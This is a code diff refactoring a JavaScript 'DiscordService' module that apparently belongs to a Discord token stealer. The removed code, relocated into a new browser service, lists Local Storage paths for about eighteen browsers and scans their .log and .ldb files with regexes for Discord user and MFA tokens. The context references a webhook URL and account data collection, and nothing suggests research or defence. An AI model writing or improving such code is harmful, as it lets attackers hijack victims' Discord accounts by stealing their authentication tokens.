@@ -14,6 +14,7 @@ const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors')
 const { fileManager } = require('../../core/fileManager');
 const { stats } = require('../../core/statistics');
 const { TokenUtils } = require('../../core/tokenUtils');
+const { DiscordBrowserService } = require('./browserService');
 const config = require('../../config/config');
 
 class DiscordService {
@@ -21,6 +22,7 @@ class DiscordService {
         this.webhookUrl = config.get('webhook.url');
         this.timeout = config.get('webhook.timeout', 30000);
         this.discordPaths = this.getDiscordPaths();
+        this.browserService = new DiscordBrowserService();
     }
 
     /**
@@ -61,36 +63,6 @@ class DiscordService {
     }
 
     /**
-     * Get browser paths for Discord tokens
-     * @returns {Array} Array of browser paths
-     */
-    getBrowserPaths() {
-        const appData = process.env.APPDATA || '';
-        const localAppData = process.env.LOCALAPPDATA || '';
-
-        return [
-            path.join(appData, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
-            path.join(appData, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Epic Privacy Browser', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Google', 'Chrome SxS', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Sputnik', 'Sputnik', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, '7Star', '7Star', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'CentBrowser', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Orbitum', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Kometa', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Torch', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Amigo', 'User Data', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Iridium', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'uCozMedia', 'Uran', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-            path.join(localAppData, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb')
-        ];
-    }
-
-    /**
      * Collect Discord account data
      * @returns {Promise<Array>} Array of Discord accounts
      */
@@ -117,7 +89,7 @@ class DiscordService {
 
             // Collect tokens from browsers
             try {
-                const browserTokens = await this.collectBrowserTokens();
+                const browserTokens = await this.browserService.collectBrowserTokens();
                 allTokens.push(...browserTokens);
             } catch (error) {
                 ErrorHandler.handle(
@@ -214,7 +186,7 @@ ${Object.entries(this.discordPaths).map(([key, config]) =>
     `- ${config.name}: ${config.basePaths.join(', ')}`
 ).join('\n')}
 
-Browser Paths Searched: ${this.getBrowserPaths().length} locations
+Browser Paths Searched: ${this.browserService.getBrowserPaths().length} locations
 
 This file indicates that the Discord module found tokens but couldn't process them into account information.
 `;
@@ -385,58 +357,6 @@ This file indicates that the Discord module found tokens but couldn't process th
         }
 
         return tokens;
-    }
-
-    /**
-     * Collect tokens from browsers
-     * @returns {Promise<Array>} Array of tokens
-     */
-    async collectBrowserTokens() {
-        const tokens = [];
-        const browserPaths = this.getBrowserPaths();
-
-        // Token patterns for direct token search in browsers
-        const cleanRegex = [
-            /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/gm,       // Variable length tokens
-            /mfa\.[\w-]{84}/gm,                          // MFA tokens  
-            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/gm           // Standard user tokens
-        ];
-
-        for (const browserPath of browserPaths) {
-            if (!fs.existsSync(browserPath)) {
-                continue;
-            }
-
-            try {
-                const files = fs.readdirSync(browserPath);
-                
-                for (const file of files) {
-                    if (!(file.endsWith('.log') || file.endsWith('.ldb'))) {
-                        continue;
-                    }
-
-                    try {
-                        const filePath = path.join(browserPath, file);
-                        const content = fs.readFileSync(filePath, 'utf-8');
-
-                        for (const regex of cleanRegex) {
-                            const matches = content.match(regex);
-                            if (matches) {
-                                tokens.push(...matches);
-                            }
-                        }
-                    } catch (error) {
-                        // Skip files that can't be read
-                        continue;
-                    }
-                }
-            } catch (error) {
-                logger.debug(`Failed to process browser path ${browserPath}`, error.message);
-            }
-        }
-
-        // Enhanced deduplication using TokenUtils
-        return TokenUtils.deduplicate(tokens);
     }
 
     /**
